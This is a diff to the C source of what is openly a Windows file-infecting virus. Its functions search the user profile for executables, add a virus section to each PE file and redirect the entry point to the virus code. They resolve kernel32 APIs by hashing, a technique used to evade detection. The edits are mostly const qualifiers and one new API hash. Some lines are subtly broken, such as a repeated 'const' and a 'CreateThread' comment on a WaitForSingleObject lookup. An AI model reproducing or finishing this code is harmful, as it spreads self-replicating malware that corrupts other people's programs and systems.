@@ -1,6 +1,9 @@
+
+#pragma once
+
 #include "everything.h"
 
-void GetFunctionAddresses(PDATA data);
+void GetFunctionAddresses(const const PDATA data);
 BYTE WINAPI IsValidExecutable(const PVOID file_data);
 BYTE WINAPI Is64BitExecutable(const PVOID file_data);
 BYTE WINAPI IsVirusExistedInFile(const PVOID file_data);
@@ -9,13 +12,13 @@ void SetEntryPoint(PVOID data, DWORD new_entry_point);
 DWORD GetEntryPoint(PVOID data);
 
 
-PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD size, PDATA data);
+PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD size, const PDATA data);
 void SetEntryPoint(PVOID data, DWORD new_entry_point);
 void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress);
 
-void WINAPI InfectUserProfile(PDATA data);
-void WINAPI FindFile(PSTR directory, PDATA data);
-void WINAPI InfectFile(PSTR file_name, PDATA data);
+void WINAPI InfectUserProfile(const PDATA data);
+void WINAPI FindFile(PSTR directory, const PDATA data);
+void WINAPI InfectFile(PSTR file_name, const PDATA data);
 
 DWORD Align(DWORD value, DWORD alignment)
 {
@@ -150,7 +153,7 @@ DWORD GetEntryPoint(PVOID data)
 }
 
 
-PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD section_size, PDATA data)
+PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD section_size, const const PDATA data)
 {
     PIMAGE_DOS_HEADER p_image_dos_header;
     PIMAGE_SECTION_HEADER p_image_section_header;
@@ -268,7 +271,7 @@ PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
 
 }
 
-void WINAPI FindFile(PSTR directory, PDATA data)
+void WINAPI FindFile(PSTR directory, const PDATA data)
 {
     HANDLE handle_find;
     WIN32_FIND_DATAA find_data;
@@ -294,7 +297,7 @@ void WINAPI FindFile(PSTR directory, PDATA data)
 
     if(handle_find != INVALID_HANDLE_VALUE)
     {
-        while(data->iat->fnFindNextFileA(handle_find, &find_data))
+        while(data->iat->fnFindNextFileA(handle_find, &find_data) && data->end_virus == 0)
         {
             if(find_data.cFileName[0] == '.')
             {
@@ -316,7 +319,7 @@ void WINAPI FindFile(PSTR directory, PDATA data)
     }
 }
 
-void WINAPI InfectUserProfile(PDATA data)
+void WINAPI InfectUserProfile(const PDATA data)
 {
     //InfectFile("E:\\Code\\C++\\1.exe", data);
     //return;
@@ -338,7 +341,7 @@ void WINAPI InfectUserProfile(PDATA data)
     FindFile(user_profile, data);
 }
 
-void GetFunctionAddresses(PDATA data)
+void GetFunctionAddresses(const PDATA data)
 {
     PPEB p_peb = NtCurrentPeb();
 
@@ -521,6 +524,12 @@ void GetFunctionAddresses(PDATA data)
         if (hash == 0x46d6e46)
         {
             data->iat->fnCreateMutexA = (pCreateMutexA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
+        }
+
+        // Hash of CreateThread
+        if (hash == 0x1965f2c6)
+        {
+            data->iat->fnWaitForSingleObject = (pWaitForSingleObject)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
         }
 
     }
